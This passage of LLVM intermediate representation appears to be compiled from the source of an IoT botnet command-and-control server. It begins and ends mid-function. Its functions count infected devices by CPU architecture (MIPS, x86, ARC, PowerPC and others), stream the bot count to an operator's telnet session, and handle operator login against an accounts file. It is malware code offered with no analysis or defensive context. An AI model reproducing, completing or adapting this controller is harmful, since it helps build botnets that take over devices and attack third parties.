  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !16

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @mpslJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 2
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !17

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @x86Joining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !18

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @spcJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 5
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !19

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @ppcJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 6
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !20

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @arcJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 9
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !21

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @unkJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 10
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !22

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 13
  %11 = load i32, i32* %10, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !23

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !24

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @client_addr(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %5 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 0
  store i64 %0, i64* %5, align 4
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 1
  store i64 %1, i64* %6, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %7, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = and i32 %9, 255
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %12 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 4
  %14 = and i32 %13, 65280
  %15 = lshr i32 %14, 8
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 4
  %19 = and i32 %18, 16711680
  %20 = lshr i32 %19, 16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  %24 = and i32 %23, -16777216
  %25 = lshr i32 %24, 24
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i32 %10, i32 %15, i32 %20, i32 %25)
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %6 = load i8*, i8** %2, align 8
  %7 = ptrtoint i8* %6 to i64
  %8 = trunc i64 %7 to i32
  store i32 %8, i32* %4, align 4
  br label %9

9:                                                ; preds = %1, %26
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %10, i8 0, i64 2048, i1 false)
  %11 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %12 = call i32 @clientsJoining()
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %14
  %16 = getelementptr inbounds %struct.account, %struct.account* %15, i32 0, i32 0
  %17 = getelementptr inbounds [200 x i8], [200 x i8]* %16, i64 0, i64 0
  %18 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.25, i64 0, i64 0), i32 27, i32 %12, i8* %17, i32 7) #10
  %19 = load i32, i32* %4, align 4
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %22 = call i64 @strlen(i8* %21) #8
  %23 = call i64 @send(i32 %19, i8* %20, i64 %22, i32 16384)
  %24 = icmp eq i64 %23, -1
  br i1 %24, label %25, label %26

25:                                               ; preds = %9
  br label %26

26:                                               ; preds = %25, %9
  %27 = call i32 @sleep(i32 2)
  br label %9
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca [80 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [2048 x i8], align 16
  %17 = alloca %struct._IO_FILE*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct._IO_FILE*, align 8
  %22 = alloca %struct._IO_FILE*, align 8
  %23 = alloca [80 x i8], align 16
  %24 = alloca [128 x i8], align 16
  %25 = alloca [128 x i8], align 16
  %26 = alloca [128 x i8], align 16
  %27 = alloca [128 x i8], align 16
  %28 = alloca [128 x i8], align 16
  %29 = alloca [128 x i8], align 16
  %30 = alloca [128 x i8], align 16
  %31 = alloca [128 x i8], align 16
  %32 = alloca [128 x i8], align 16
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca %struct._IO_FILE*, align 8
  %35 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %4, align 4
  %36 = load i8*, i8** %3, align 8
  %37 = ptrtoint i8* %36 to i64
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %5, align 4
  %39 = load i32, i32* %4, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %4, align 4
  %41 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %41, i8 0, i64 2048, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0), i8** %13, align 8
  store i32 0, i32* %15, align 4
  %42 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 2048, i1 false)
  %43 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %43, i8 0, i64 2048, i1 false)
  store i32 0, i32* %18, align 4
  %44 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i64 0, i64 0))
  store %struct._IO_FILE* %44, %struct._IO_FILE** %17, align 8
  br label %45

45:                                               ; preds = %50, %1
  %46 = load %struct._IO_FILE*, %struct._IO_FILE** %17, align 8
  %47 = call i32 @feof(%struct._IO_FILE* %46) #10
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** %17, align 8
  %52 = call i32 @fgetc(%struct._IO_FILE* %51)
  store i32 %52, i32* %19, align 4
  %53 = load i32, i32* %18, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %18, align 4
  br label %45, !llvm.loop !25

55:                                               ; preds = %45
  store i32 0, i32* %20, align 4
  %56 = load %struct._IO_FILE*, %struct._IO_FILE** %17, align 8
  call void @rewind(%struct._IO_FILE* %56)
  br label %57

57:                                               ; preds = %62, %55
  %58 = load i32, i32* %20, align 4
  %59 = load i32, i32* %18, align 4
  %60 = sub nsw i32 %59, 1
  %61 = icmp ne i32 %58, %60
  br i1 %61, label %62, label %82

62:                                               ; preds = %57
  %63 = load %struct._IO_FILE*, %struct._IO_FILE** %17, align 8
  %64 = load i32, i32* %20, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.account, %struct.account* %66, i32 0, i32 0
  %68 = getelementptr inbounds [200 x i8], [200 x i8]* %67, i64 0, i64 0
  %69 = load i32, i32* %20, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %70
  %72 = getelementptr inbounds %struct.account, %struct.account* %71, i32 0, i32 1
  %73 = getelementptr inbounds [200 x i8], [200 x i8]* %72, i64 0, i64 0
  %74 = load i32, i32* %20, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %75
  %77 = getelementptr inbounds %struct.account, %struct.account* %76, i32 0, i32 2
  %78 = getelementptr inbounds [200 x i8], [200 x i8]* %77, i64 0, i64 0
  %79 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %63, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i8* %68, i8* %73, i8* %78)
  %80 = load i32, i32* %20, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %20, align 4
  br label %57, !llvm.loop !26

82:                                               ; preds = %57
  %83 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %84 = call i32 (i8*, i8*, ...) @sprintf(i8* %83, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i64 0, i64 0)) #10
  %85 = load i32, i32* %5, align 4
  %86 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %87 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %88 = call i64 @strlen(i8* %87) #8
  %89 = call i64 @send(i32 %85, i8* %86, i64 %88, i32 16384)
  %90 = icmp eq i64 %89, -1
  br i1 %90, label %91, label %92

91:                                               ; preds = %82
  br label %606

92:                                               ; preds = %82
  %93 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %94 = load i32, i32* %5, align 4
  %95 = call i32 @fdgets(i8* %93, i32 2048, i32 %94)
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %97, label %98

97:                                               ; preds = %92
  br label %606

98:                                               ; preds = %92
  %99 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %99)
  %100 = getelementptr inbounds [80 x i8], [80 x i8]* %11, i64 0, i64 0
  %101 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %102 = call i32 (i8*, i8*, ...) @sprintf(i8* %100, i8* %101) #10
  %103 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8* %103, i8** %10, align 8
  %104 = load i8*, i8** %10, align 8
  %105 = call i32 @Search_in_File(i8* %104)
  store i32 %105, i32* %6, align 4
  %106 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %106, %struct._IO_FILE** %21, align 8
  %107 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %108 = load i8*, i8** %10, align 8
  %109 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %107, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* %108)
  %110 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %111 = call i32 @fclose(%struct._IO_FILE* %110)
  %112 = load i8*, i8** %10, align 8
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* %112)
  %114 = load i8*, i8** %10, align 8
  %115 = load i32, i32* %6, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %116
  %118 = getelementptr inbounds %struct.account, %struct.account* %117, i32 0, i32 0
  %119 = getelementptr inbounds [200 x i8], [200 x i8]* %118, i64 0, i64 0
  %120 = call i32 @strcmp(i8* %114, i8* %119) #8
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %151

122:                                              ; preds = %98
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %124 = call i32 (i8*, i8*, ...) @sprintf(i8* %123, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i64 0, i64 0)) #10
  %125 = load i32, i32* %5, align 4
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %127 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %128 = call i64 @strlen(i8* %127) #8
  %129 = call i64 @send(i32 %125, i8* %126, i64 %128, i32 16384)
  %130 = icmp eq i64 %129, -1
  br i1 %130, label %131, label %132

131:                                              ; preds = %122
  br label %606

132:                                              ; preds = %122
  %133 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %134 = load i32, i32* %5, align 4
  %135 = call i32 @fdgets(i8* %133, i32 2048, i32 %134)
  %136 = icmp slt i32 %135, 1
  br i1 %136, label %137, label %138

137:                                              ; preds = %132
  br label %606

138:                                              ; preds = %132
  %139 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %139)
  %140 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %142
  %144 = getelementptr inbounds %struct.account, %struct.account* %143, i32 0, i32 1
  %145 = getelementptr inbounds [200 x i8], [200 x i8]* %144, i64 0, i64 0
  %146 = call i32 @strcmp(i8* %140, i8* %145) #8
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %149

148:                                              ; preds = %138
  br label %152

149:                                              ; preds = %138
  %150 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %150, i8 0, i64 2048, i1 false)
  br label %164

151:                                              ; preds = %98
  br label %152

152:                                              ; preds = %151, %148
  %153 = load i32, i32* %5, align 4
  %154 = call i64 @send(i32 %153, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i64 5, i32 16384)
  %155 = icmp eq i64 %154, -1
  br i1 %155, label %156, label %157

156:                                              ; preds = %152
  br label %606

157:                                              ; preds = %152
  %158 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %158, %struct._IO_FILE** %22, align 8
  %159 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %160 = load i8*, i8** %10, align 8
  %161 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %159, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0), i8* %160)
  %162 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %163 = call i32 @fclose(%struct._IO_FILE* %162)
  br label %606

164:                                              ; preds = %149
  %165 = load i32, i32* %5, align 4
  %166 = call i64 @send(i32 %165, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 14, i32 16384)
  %167 = icmp eq i64 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %164
  br label %606

169:                                              ; preds = %164
  %170 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %171 = load i32, i32* %6, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %172
  %174 = getelementptr inbounds %struct.account, %struct.account* %173, i32 0, i32 0
  %175 = getelementptr inbounds [200 x i8], [200 x i8]* %174, i64 0, i64 0
  %176 = call i32 (i8*, i8*, ...) @sprintf(i8* %170, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.37, i64 0, i64 0), i8* %175) #10
  %177 = load i32, i32* %5, align 4
  %178 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %179 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %180 = call i64 @strlen(i8* %179) #8
  %181 = call i64 @send(i32 %177, i8* %178, i64 %180, i32 16384)
  %182 = icmp eq i64 %181, -1
  br i1 %182, label %183, label %184

183:                                              ; preds = %169
  br label %606

184:                                              ; preds = %169
  %185 = load i8*, i8** %3, align 8
  %186 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %185) #10
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %188
  %190 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %189, i32 0, i32 3
  store i32 1, i32* %190, align 4
  br label %191

191:                                              ; preds = %582, %581, %184
  %192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %193 = load i32, i32* %5, align 4
